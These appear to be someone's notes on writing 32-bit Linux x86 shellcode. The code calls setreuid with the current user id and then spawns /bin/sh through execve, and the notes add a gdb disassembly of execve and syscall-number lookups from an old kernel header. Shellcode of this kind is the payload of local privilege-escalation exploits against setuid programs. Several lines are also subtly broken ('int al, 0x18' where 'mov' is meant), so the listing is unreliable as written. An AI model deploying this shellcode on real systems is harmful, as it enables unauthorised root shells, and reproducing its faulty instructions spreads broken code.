

.intel_syntax noprefix
.global main
main:
    //getuid
    xor eax, eax
    int al, 0x18
    int 0x80

    //setreuid
    mov ebx, eax
    mov ecx, eax
    xor eax, eax
    int al, 0x46
    int 0x80

    //arg3 : edx
    xor edx, edx

    //arg1 -> "/bin/sh"
    push edx
    push 0x68732f2f
    push 0x6e69622f    
    mov ebx, esp
    
    //arg2 -> ecx
    push edx
    push ebx
    mov ecx, esp

    //int
    xor eax, eax
    mov al, 0xb
    int 0x80

    

0x804d062 <__execve+22>:	mov    0xc(%ebp),%ecx
0x804d065 <__execve+25>:	mov    0x10(%ebp),%edx
0x804d068 <__execve+28>:	push   %ebx
0x804d069 <__execve+29>:	mov    %edi,%ebx
0x804d06b <__execve+31>:	mov    $0xb,%eax
0x804d070 <__execve+36>:	int    $0x80

sfp
ret
arg1 ;sfp+8 ebx
arg2 ;sfp+c ecx
arg3 :sfp+10 edx


#getuid ID
[gate@localhost tmp]$ cat /usr/src/linux-2.2.14/include/asm-i386/unistd.h | grep getuid
#define __NR_getuid		 24

xor eax, eax
int al, 0x18
int 0x80

#setuid ID
[gate@localhost tmp]$ cat /usr/src/linux-2.2.14/include/asm-i386/unistd.h | grep setreuid
#define __NR_setreuid		 70

mov ebx, eax
mov ecx, eax
xor eax, eax
int al, 0x46
int 0x80

